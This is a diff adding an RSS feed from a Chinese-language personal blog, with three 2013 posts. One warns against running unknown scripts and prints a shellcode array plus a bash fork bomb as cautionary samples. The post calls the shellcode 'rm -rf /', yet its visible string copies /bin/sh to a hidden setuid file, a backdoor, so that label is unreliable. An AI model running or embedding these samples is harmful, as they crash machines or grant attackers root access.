@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Geek on kfei&#39;s brainfuck</title>
+    <link>https://kfei.net/posts/tags/geek/</link>
+    <description>Recent content in Geek on kfei&#39;s brainfuck</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-tw</language>
+    <lastBuildDate>Tue, 29 Oct 2013 02:12:00 +0800</lastBuildDate>
+    <atom:link href="https://kfei.net/posts/tags/geek/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>好奇殺死一隻貓</title>
+      <link>https://kfei.net/posts/2013/10/%E5%A5%BD%E5%A5%87%E6%AE%BA%E6%AD%BB%E4%B8%80%E9%9A%BB%E8%B2%93/</link>
+      <pubDate>Tue, 29 Oct 2013 02:12:00 +0800</pubDate>
+      
+      <guid>https://kfei.net/posts/2013/10/%E5%A5%BD%E5%A5%87%E6%AE%BA%E6%AD%BB%E4%B8%80%E9%9A%BB%E8%B2%93/</guid>
+      <description>&lt;p&gt;除了不要亂點來路不明的連結外, 來路不明的 shell script 當然也不可以隨便執行哦!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;char rmrf[] __attribute__ ((section(“.text”)))
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.cmd; chmod 4755
+/tmp/.cmd;”;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Warning:&lt;/em&gt;&lt;/strong&gt; 這是 &lt;code&gt;rm –rf /&lt;/code&gt; 的 hex 版本.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;:(){ :|: &amp;amp; };:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Warning:&lt;/em&gt;&lt;/strong&gt; 定義一個會 fork 自己的 bash function, 然後 fork 他&amp;hellip;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>是否具有可讀性?</title>
+      <link>https://kfei.net/posts/2013/10/%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E5%8F%AF%E8%AE%80%E6%80%A7/</link>
+      <pubDate>Tue, 22 Oct 2013 06:25:00 +0800</pubDate>
+      
+      <guid>https://kfei.net/posts/2013/10/%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89%E5%8F%AF%E8%AE%80%E6%80%A7/</guid>
+      <description>&lt;pre&gt;&lt;code class=&#34;language-brainfuck&#34;&gt;++++++++[&amp;gt;+&amp;gt;++&amp;gt;+++&amp;gt;++++&amp;gt;+++++&amp;gt;++++++&amp;gt;+++++++&amp;gt;++++++++&amp;gt;+++++++++&amp;gt;++++++++++&amp;gt;+++++++++++&amp;gt;++++++++++++&amp;gt;+++++++++++++&amp;gt;++++++++++++++&amp;gt;+++++++++++++++&amp;gt;++++++++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;.&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++.+++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++-.++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++-.++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;-.+&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;.&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++.+++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+.-&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++-.++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+++-.++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+.-&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;+.-&amp;lt;&amp;lt;&amp;lt;&amp;lt;.
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Reordering windows in GNU Screen</title>
+      <link>https://kfei.net/posts/2013/10/reordering-windows-in-gnu-screen/</link>
+      <pubDate>Sat, 12 Oct 2013 03:31:00 +0800</pubDate>
+      
+      <guid>https://kfei.net/posts/2013/10/reordering-windows-in-gnu-screen/</guid>
+      <description>&lt;p&gt;對於一個重度 Screen 使用者來說, workspace window 一開十幾個是很常見的事,
+然而視窗一多, 愛整理工作環境的毛病就會犯, 這時候就需要把 Screen
+裡的視窗重新排序分類一下了. 在 Screen 裡可以透過 &lt;code&gt;number [n]&lt;/code&gt;
+指令來更改當前視窗的編號:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C-a :number NUM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Hint:&lt;/em&gt; 如果想把一個視窗&amp;rdquo;釘死&amp;rdquo;在最右邊, 可以用 &lt;code&gt;C-a :number 999&lt;/code&gt; 這樣的小技巧!&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
